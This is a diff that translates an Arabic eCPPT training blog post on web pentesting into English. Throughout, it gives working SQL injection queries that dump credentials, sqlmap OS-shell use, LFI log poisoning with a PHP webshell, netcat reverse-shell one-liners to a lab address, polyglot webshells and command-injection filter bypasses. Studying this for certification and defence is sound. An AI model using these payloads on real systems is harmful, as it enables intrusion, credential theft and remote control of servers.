@@ -3,7 +3,7 @@ title: "eCPPT Deep-Dive: Part 8 - Web Application Pentesting: OWASP WSTG & Criti
 date: 2026-11-12 15:00:00 +0300
 categories: [Cyber Security, Penetration Testing]
 tags: [ecppt, web-pentesting, owasp, sql-injection, xss, lfi, file-upload, web-security]
-description: "الدليل الشامل للجزء الثامن من مسار eCPPT: منهجية فحص الويب القياسية OWASP WSTG، تشريح حقن SQL المباشر والعمياء، استغلال تضمين الملفات LFI وتحويلها إلى RCE، وتجاوز آليات فحص رفع الملفات."
+description: "An exhaustive technical breakdown of Part 8 of the eCPPT curriculum: the OWASP Web Security Testing Guide (WSTG) methodology, In-Band and Blind SQL Injection, weaponizing Local File Inclusion (LFI to RCE via Log Poisoning), and advanced file upload filter evasion."
 image:
   path: /assets/images/posts/ecppt/part-8-cover.png
   alt: "eCPPT Masterclass Part 8 - Web Application Pentesting: OWASP WSTG & Critical Flaws"
@@ -14,208 +14,200 @@ schema:
   author: Abdulrahman M. Fathi
 ---
 
-في معظم سيناريوهات اختبارات الاختراق الميدانية وبيئة امتحان **eCPPT**، تكون بوابة الدخول الأولى لشبكة الهدف عبر خدمة ويب عامة (Web Application). قد تكون واجهة إدارة خاصة، أو مدونة بنظام إدارة محتوى، أو واجهة استعلامات داخلية للموظفين.
+In the vast majority of real-world assessments and specifically within the **eCPPT (eLearnSecurity Certified Professional Penetration Tester)** examination environment, web applications serve as the primary external gateway into an organization's internal network. Whether targeting custom enterprise portals, legacy PHP CMS installations, or internal administrative dashboards, web vulnerabilities provide the critical initial foothold required to pivot further into the enterprise.
 
-في هذا الجزء، سنغطي منهجية اختبار تطبيقات الويب بالاعتماد على معيار **OWASP Web Security Testing Guide (WSTG)**، ونستعرض بالتشريح العملي أكثر الثغرات تأثيرًا وخطورة: بدءًا من ثغرات حقن قواعد البيانات (**SQL Injection**) بأنواعها، مرورًا بثغرات تضمين الملفات المحلية (**LFI**) وكيفية تحويلها لتنفيذ أوامر برمجية كاملة (**RCE**)، وانتهاءً بحيل تجاوز فلاتر رفع الملفات الخبيثة (**File Upload Bypasses**).
+In this deep dive, we walk through the standardized testing framework defined by the **OWASP Web Security Testing Guide (WSTG v4.2)** and provide an in-depth technical breakdown of high-impact vulnerabilities: **SQL Injection (In-Band, Error-based, and Blind)**, escalating **Local File Inclusion (LFI) to Remote Code Execution (RCE)** via log poisoning, and bypassing restrictive **File Upload Filters**.
 
 ---
 
-### جدول التنقل في السلسلة (Series Navigation)
+### Series Navigation
 
-| **المقال السابق** | **المقال الحالي** | **المقال القادم** |
+| **Previous Part** | **Current Part** | **Next Part** |
 | :---: | :---: | :---: |
-| [الجزء 7: خوادم القيادة والتحكم (C2 Frameworks)](/posts/ecppt-v3-part-7-command-and-control-c2/) | **الجزء 8: اختبار اختراق تطبيقات الويب (Web Pentesting)** | [الجزء 9: الهجمات من جانب العميل (Client-Side Attacks)](/posts/ecppt-v3-part-9-client-side-attacks/) |
+| [Part 7: Command and Control (C2) Infrastructure](/posts/ecppt-v3-part-7-command-and-control-c2/) | **Part 8: Web Application Pentesting** | [Part 9: Client-Side Attacks & Weaponization](/posts/ecppt-v3-part-9-client-side-attacks/) |
 
 ---
 
-## أبرز النقاط الرئيسية (Key Takeaways)
+## Key Takeaways
 
-* **منهجية OWASP WSTG v4.2**: الاعتماد على منهجية اختبار قياسية تغطي 12 مجالاً أمنيًا تشمل إدارة الهويات، استيقان المستخدمين، صلاحيات الوصول، والتحقق من صحة المدخلات.
-* **حقن SQL المتصل (In-Band Union-Based SQLi)**: استخراج البيانات عبر القناة المباشرة نفسها يتطلب تحديد عدد الأعمدة الدقيق باستخدام `ORDER BY`، ثم معرفة الأعمدة المنعكسة في الصفحة لتمرير بيانات الجداول من `information_schema`.
-* **حقن SQL الأعمى (Blind SQLi)**: عندما لا تظهر مخرجات الاستعلام على الشاشة، نستخدم الأسلوب المنطقي الثنائي (Boolean-based) أو استجابة التأخير الزمني (Time-based عبر `SLEEP()` أو `WAITFOR DELAY`) لاستخراج البيانات بايتًا تلو الآخر.
-* **تحويل ثغرة LFI إلى RCE عبر تلويث السجلات (Log Poisoning)**: استغلال إمكانية قراءة ملفات السيرفر مثل سجلات أباتشي (`/var/log/apache2/access.log`) أو سجلات SSH (`/var/log/auth.log`)، وحقن كود PHP خبيث داخل ترويسة `User-Agent` ثم استدعاء ملف السجل لتنفيذ الشيفرة.
-* **تجاوز فلاتر رفع الملفات (File Upload Evasion)**: الالتفاف على الفلاتر السطحية بتغيير امتدادات الملفات (`.phtml`, `.php5`)، التلاعب بترويسة `Content-Type`، واستخدام البايت الصفري أو تقنيات الصور المتعددة (Polyglot Images).
+* **OWASP WSTG v4.2 Framework**: Industry-standard web assessment methodology encompassing 12 testing categories, from passive information gathering and identity verification to input validation and business logic testing.
+* **In-Band Union-Based SQLi Mechanics**: Extracting database records directly within the HTTP response stream requires determining the exact column count via `ORDER BY`, mapping the reflected output columns, and extracting metadata tables from `information_schema`.
+* **Blind SQL Injection**: When query results are not reflected in the application UI, we infer database contents bit by bit using binary state responses (**Boolean-based Blind**) or database delay routines (**Time-based Blind** via `SLEEP()` or `WAITFOR DELAY`).
+* **LFI to RCE via Log Poisoning**: Local File Inclusion (LFI) vulnerabilities can be escalated to full operating system shells by injecting PHP payloads into server logs (such as `/var/log/apache2/access.log` via the `User-Agent` header or `/var/log/auth.log` via SSH) and subsequently including the log file.
+* **File Upload Filter Evasion**: Bypassing defensive file upload controls through client-side validation tampering, `Content-Type` header spoofing, double extensions, null byte injections, and crafting valid **Polyglot Webshells** with `exiftool`.
 
 ---
 
-## 1. دورة اختبار تطبيقات الويب وفق OWASP WSTG
-
-يوضح المخطط المنهجي التالي مراحل فحص تطبيقات الويب بدءًا من جمع المعلومات حتى استخراج الصلاحيات:
+## 1. Web Penetration Testing Lifecycle (OWASP WSTG)
 
 ```mermaid
 flowchart TD
-    Recon["1. الاستكشاف وجمع المعلومات (Reconnaissance)<br/>- كشف النطاقات الفرعية (Subfinder / Amass)<br/>- كشف التقنيات (Wappalyzer / Whatweb)<br/>- كشف المسارات الخفية (ffuf / Feroxbuster)"]
+    Recon["1. Reconnaissance & Discovery<br/>• Subdomain Enumeration (Subfinder, Amass)<br/>• Technology Stack Profiling (Wappalyzer, WhatWeb)<br/>• Directory & Parameter Fuzzing (ffuf, Feroxbuster)"]
     
-    Recon --> Scan["2. الفحص الأولي واكتشاف الثغرات<br/>- فحص الخادم بواسطة Nikto<br/>- تشغيل قوالب Nuclei المحدثة"]
+    Recon --> Scan["2. Vulnerability Assessment<br/>• Automated Baseline Scanning (Nikto, Nuclei)<br/>• Manual Parameter and Request Mapping via Burp Suite"]
     
-    Scan --> InputValidation["3. اختبار فلاتر المدخلات (Input Validation Testing)"]
+    Scan --> InputValidation["3. Input Validation Exploitation Testing"]
     
-    InputValidation --> SQLi["حقن قواعد البيانات (SQL Injection)<br/>- Union-based<br/>- Error-based<br/>- Blind (Boolean / Time)"]
-    InputValidation --> LFI["تضمين الملفات وقراءة المسارات<br/>- LFI / Path Traversal<br/>- Log Poisoning -> RCE<br/>- PHP Wrappers"]
-    InputValidation --> Upload["رفع الملفات الخبيثة<br/>- تجاوز MIME Type<br/>- Polyglot Webshells"]
-    InputValidation --> XSS["ثغرات السكربتات المتقاطعة<br/>- Stored / Reflected XSS<br/>- سرقة ملفات الارتباط (Cookies)"]
+    InputValidation --> SQLi["SQL Injection (SQLi)<br/>• Union-Based Data Extraction<br/>• Error-Based XML/XPath Queries<br/>• Time-Based Blind Inference"]
+    InputValidation --> LFI["File Inclusion & Traversal<br/>• PHP Wrappers (php://filter)<br/>• Log Poisoning -> RCE"]
+    InputValidation --> Upload["Arbitrary File Upload<br/>• MIME-Type & Extension Evasion<br/>• Image Polyglot Shells"]
+    InputValidation --> XSS["Cross-Site Scripting (XSS)<br/>• Stored / Reflected XSS<br/>• Session Hijacking"]
     
-    SQLi & LFI & Upload --> Foothold["الحصول على WebShell والوصول الأولي للسيرفر (Foothold)"]
+    SQLi & LFI & Upload --> Foothold["Achieve Remote Code Execution (RCE) / System Foothold"]
 ```
 
 ---
 
-## 2. احتراف ثغرات حقن قواعد البيانات (SQL Injection Mastery)
+## 2. SQL Injection: From Discovery to Full Database Dump
 
-تحدث ثغرة SQLi عندما يتم دمج مدخلات المستخدم مباشرة داخل استعلام قاعدة البيانات دون استخدام الاستعلامات المجهزة (Parameterized Queries).
+SQL injection occurs when untrusted user input is directly concatenated into a dynamic SQL query without parameterization or proper escaping.
 
-### تشريح هجوم Union-Based SQL Injection:
+### Dissecting In-Band Union-Based SQL Injection:
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor Pentester as مختبر الاختراق
-    participant WebApp as خادم الويب
-    participant Database as قاعدة بيانات MySQL
+    actor Pentester as Penetration Tester
+    participant WebApp as Web Application (PHP Backend)
+    participant Database as MySQL Database Engine
     
     Pentester->>WebApp: GET /products.php?id=1' ORDER BY 5-- -
-    WebApp->>Database: تنفيذ الاستعلام
-    Database-->>WebApp: خطأ: Unknown column '5' in 'order clause'
-    Note over Pentester: عدد الأعمدة في الاستعلام الأصلي هو 4 أعمدة بالضبط!
+    WebApp->>Database: Executes query with ORDER BY 5
+    Database-->>WebApp: Error: Unknown column '5' in 'order clause'
+    Note over Pentester: Result: Query selects exactly 4 columns!
     
     Pentester->>WebApp: GET /products.php?id=-1' UNION SELECT 1,2,3,4-- -
-    WebApp-->>Pentester: تظهر الصفحة أرقام 2 و 3 في التصميم (الأعمدة القابلة للعرض)
+    WebApp-->>Pentester: Page renders numbers '2' and '3' on the screen (Reflected Columns)
     
     Pentester->>WebApp: GET /products.php?id=-1' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
-    WebApp-->>Pentester: استخراج أسماء الجداول السرية (users, admins, tokens)!
+    WebApp-->>Pentester: Displays database table names: 'users', 'orders', 'secrets'!
 ```
 
-### الأوامر والاستعلامات التكتيكية الميدانية:
+### Production SQL Injection Commands & Queries:
 
-#### 1. استخراج أسماء الجداول والأعمدة في MySQL / MariaDB:
+#### 1. Manual MySQL / MariaDB Union Queries:
 ```sql
--- 1. كشف اسم قاعدة البيانات الحالية والإصدار والمستخدم
+-- Step 1: Discover database name, version, and active database user
 ' UNION SELECT 1, database(), version(), user()-- -
 
--- 2. استخراج كافة أسماء الجداول في قاعدة البيانات الحالية
+-- Step 2: Enumerate all table names in the current database
 ' UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()-- -
 
--- 3. استخراج أسماء الأعمدة في جدول users
+-- Step 3: Enumerate column names inside the target 'users' table
 ' UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_name='users'-- -
 
--- 4. تفريغ بيانات اسم المستخدم وكلمة المرور
+-- Step 4: Dump credentials (username and password hash separated by a colon)
 ' UNION SELECT 1, group_concat(username, 0x3a, password), 3, 4 FROM users-- -
 ```
 
-#### 2. الاستغلال الآلي المتقدم عبر sqlmap:
+#### 2. Automated Exploitation via `sqlmap`:
 ```bash
-# فحص وتفريغ قاعدة البيانات بشكل آلي وتخطي الفلاتر
+# Automated scanning with aggressive heuristics and tamper evasion
 sqlmap -u "http://10.10.10.50/view.php?id=1" --batch --random-agent --level=5 --risk=3 --dbs
 
-# تفريغ بيانات جدول المستخدمين
+# Dump specific target database tables
 sqlmap -u "http://10.10.10.50/view.php?id=1" -D app_db -T users --dump
 
-# محاولة فتح نظام أوامر تفاعلي على السيرفر (إذا امتلك حساب SQL صلاحية FILE)
+# Spawn an interactive OS shell (if database user has FILE and stacked query privileges)
 sqlmap -u "http://10.10.10.50/view.php?id=1" --os-shell
 ```
 
 ---
 
-## 3. ثغرات تضمين الملفات والوصول إلى RCE (LFI to RCE)
+## 3. Local File Inclusion (LFI) to Remote Code Execution (RCE)
 
-تسمح ثغرة **Local File Inclusion (LFI)** للمهاجم بقراءة ملفات حساسة من نظام تشغيل الخادم نتيجة استخدام دوال تضمين مثل `include()`, `require()` مع مدخلات المستخدم دون تدقيق.
+When applications use dynamic parameters in file-loading functions (`include()`, `require()` in PHP), directory traversal characters (`../../`) allow arbitrary local file reads.
 
-### 1. استكشاف الملفات عبر أغلفة PHP (PHP Wrappers):
-إذا كان الكود يقوم بإضافة امتداد `.php` تلقائيًا ويمنع قراءة الأكواد البرمجية مباشرة، نستخدم مرشحات التحويل لقراءة السورس كود مشفرًا بـ Base64:
+### 1. Source Code Extraction via PHP Wrappers:
+If the application appends a file extension (e.g., `include($_GET['page'] . ".php");`), direct file reads will fail. We leverage stream filters to read base64-encoded source code:
 
 ```text
 http://10.10.10.50/index.php?page=php://filter/convert.base64-encode/resource=config
 ```
-نقوم بفك تشفير النص المسترجع للحصول على بيانات الاتصال بقاعدة البيانات ومفاتيح التشفير!
+
+Base64 decoding the returned string reveals underlying database credentials and API tokens!
 
 ---
 
-### 2. تحويل LFI إلى تنفيذ أوامر كامل (Log Poisoning):
+### 2. Weaponizing LFI to RCE via Log Poisoning:
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor Attacker as جهاز المهاجم
-    participant Apache as خادم الويب (Apache)
-    participant Log as ملف السجل (/var/log/apache2/access.log)
+    actor Attacker as Attacker (Kali Linux)
+    participant Apache as Apache Web Server
+    participant AccessLog as Server Log (/var/log/apache2/access.log)
     
-    Attacker->>Apache: إرسال طلب HTTP متعمد يحتوي كود PHP خبيث في User-Agent:<br/>User-Agent: <?php system($_GET['cmd']); ?>
-    Apache->>Log: تسجيل تفاصيل الزيارة بالكامل داخل access.log متضمنة كود PHP!
+    Attacker->>Apache: Transmit HTTP GET request with PHP payload in User-Agent header:<br/>User-Agent: <?php system($_GET['cmd']); ?>
+    Apache->>AccessLog: Writes full request entry into access.log containing raw PHP code!
     
-    Attacker->>Apache: استدعاء ملف السجل عبر ثغرة LFI وتمرير الأمر:<br/>GET /index.php?page=/var/log/apache2/access.log&cmd=id
-    Apache->>Log: قراءة ملف السجل وتفسير كود PHP المخزن بداخله
-    Apache-->>Attacker: مخرج الأمر: uid=33(www-data) gid=33(www-data) groups=33!
+    Attacker->>Apache: Invoke LFI parameter pointing to access.log:<br/>GET /index.php?page=/var/log/apache2/access.log&cmd=id
+    Apache->>AccessLog: PHP interpreter executes the poisoned code inside the log file!
+    Apache-->>Attacker: Command output returned in response: uid=33(www-data) gid=33(www-data)!
 ```
 
-#### الأوامر العملية لتنفيذ هجوم Log Poisoning:
+#### Execution Commands for Log Poisoning:
 
 ```bash
-# 1. تلويث سجل Apache عبر cURL
+# 1. Poison Apache access log using curl
 curl -s -H "User-Agent: <?php system(\$_GET['c']); ?>" "http://10.10.10.50/index.php"
 
-# 2. التحقق من تنفيذ الأوامر عبر المتصفح أو الطرفية
+# 2. Verify command execution via LFI
 curl "http://10.10.10.50/index.php?page=/var/log/apache2/access.log&c=whoami"
 
-# 3. إرسال اتصال عكسي كامل (Reverse Shell)
+# 3. Spawn a reverse shell back to Kali
 curl "http://10.10.10.50/index.php?page=/var/log/apache2/access.log&c=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.5+4444+>/tmp/f"
 ```
 
 ---
 
-## 4. تقنيات تجاوز فلاتر رفع الملفات (File Upload Bypass Tactics)
+## 4. File Upload Vulnerability Evasion Techniques
 
-إذا وفر الموقع ميزة رفع صور شخصية أو مستندات، يحاول المهاجم رفع شل خبيث (WebShell). تضع التطبيقات عوائق دفاعية يمكن الالتفاف عليها:
+When testing file upload functionality, applications frequently employ layered defenses that can be systematically bypassed:
 
-| نوع الفحص الدفاعي | آلية الدفاع | تقنية التجاوز (Bypass Vector) |
+| Defense Mechanism | Validation Logic | Evasion Technique |
 | :--- | :--- | :--- |
-| **Client-Side Validation** | سكربت JavaScript يتحقق من الامتداد في المتصفح | إيقاف JavaScript، أو اعتراض الطلب في Burp Suite وتغيير الامتداد بعد الفحص |
-| **MIME-Type Verification** | فحص ترويسة `Content-Type` في طلب HTTP | تغيير `Content-Type: application/x-php` إلى `image/jpeg` أو `image/png` |
-| **Blacklist Extension** | حظر امتدادات محددة مثل `.php`, `.asp` | تجربة امتدادات بديلة: `.phtml`, `.php3`, `.php4`, `.php5`, `.phar`, `.inc` |
-| **Case Sensitivity** | التحقق الحساس لحالة الأحرف | استخدام أحرف كبيرة وصغيرة: `.pHp`, `.pHP5`, `.PhP` |
-| **Magic Bytes Inspection** | فحص البايتات الأولى من الملف للتأكد من أنه صورة حقيقية | دمج كود الـ PHP داخل صورة حقيقية (Polyglot) عبر أداة `exiftool` |
+| **Client-Side Validation** | JavaScript function checks file extension in browser | Intercept POST request in Burp Suite and rename the file after validation runs. |
+| **MIME-Type Verification** | Server inspects `Content-Type` HTTP header | Change `Content-Type: application/x-php` to `image/jpeg` or `image/png`. |
+| **Blacklist Filtering** | Blocks `.php`, `.asp`, `.exe` | Use alternate extensions: `.phtml`, `.php3`, `.php4`, `.php5`, `.phar`, `.inc`. |
+| **Case-Insensitive Bypass** | Simple case-sensitive string matching | Use mixed-case extensions: `.pHp`, `.pHP5`, `.PhP`. |
+| **Magic Bytes Inspection** | Verifies file header bytes match image signatures | Prepend valid GIF/JPEG magic bytes (`GIF89a;`) or create an image polyglot. |
 
-### صناعة شل مدمج داخل صورة حقيقية (Image Polyglot):
+### Crafting Image Polyglots with `exiftool`:
 
 ```bash
-# إضافة كود PHP داخل تعليق صورة GIF/JPEG حقيقية دون إفساد بنيتها
+# Inject PHP webshell into a legitimate image's comment metadata without corrupting the file
 exiftool -Comment="<?php system(\$_GET['cmd']); ?>" legit_photo.jpg -o shell.php.jpg
 
-# أو إضافة Magic Bytes يدوية لملف PHP ليظهر كصورة GIF:
+# Or prepend raw GIF magic bytes manually:
 echo -e 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
 ---
 
-## 5. ثغرات حقن الأوامر البرمجية (OS Command Injection)
+## 5. OS Command Injection Evasion
 
-عندما يمرر التطبيق مدخلات المستخدم إلى أوامر النظام مثل `ping`, `nslookup`, `traceroute`:
+When applications pass user input to system shells (e.g., executing `system("ping -c 3 " . $ip)`):
 
-```php
-// كود مصاب في PHP
-$target = $_POST['ip'];
-system("ping -c 3 " . $target);
-```
-
-### تقنيات الالتفاف على فلاتر الحماية والفراغات:
-* **عوامل التسلسل**: استخدام `;` أو `&&` أو `||` أو الرمز الأنبوبي `|`.
-* **الالتفاف على حظر المسافات**: استخدام متغير المسافة في Bash `${IFS}`:
+* **Command Separators**: Chain arbitrary commands using `;`, `&&`, `||`, or `|`.
+* **Bypassing Whitespace Filters**: Use the internal bash separator `${IFS}`:
   ```text
   127.0.0.1;cat${IFS}/etc/passwd
   ```
-* **تخطي حظر الكلمات المفتاحية**: استخدام التنصيص الفارغ أو المتغيرات:
+* **Bypassing Blacklisted Words**: Use quote concatenation or wildcard expansion:
   ```text
   127.0.0.1;c'a't /et'c'/pas's'wd
-  127.0.0.1;echo$IFS$PATH
+  127.0.0.1;/bin/n? 10.10.14.5 4444 -e /bin/sh
   ```
 
 ---
 
-## المراجع والمصادر الخارجية (References & Further Reading)
+## References & Further Reading
 
-1. **OWASP Web Security Testing Guide (WSTG v4.2)**: المرجع الرسمي القياسي لاختبار تطبيقات الويب: [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/)
-2. **PortSwigger Web Security Academy**: المعمل التدريبي العالمي الرائد في ثغرات الويب: [https://portswigger.net/web-security](https://portswigger.net/web-security)
+1. **OWASP Web Security Testing Guide (WSTG v4.2)**: [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/)
+2. **PortSwigger Web Security Academy**: [https://portswigger.net/web-security](https://portswigger.net/web-security)
 3. **PayloadsAllTheThings - Web Exploitation Repository**: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-4. **SecLists Discovery & Fuzzing Wordlists by Daniel Miessler**: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
+4. **SecLists Fuzzing & Discovery Wordlists** by Daniel Miessler: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
 5. **MITRE ATT&CK Matrix**:
    * Technique T1190: Exploit Public-Facing Application
    * Technique T1059.006: Command and Scripting Interpreter: Python/PHP
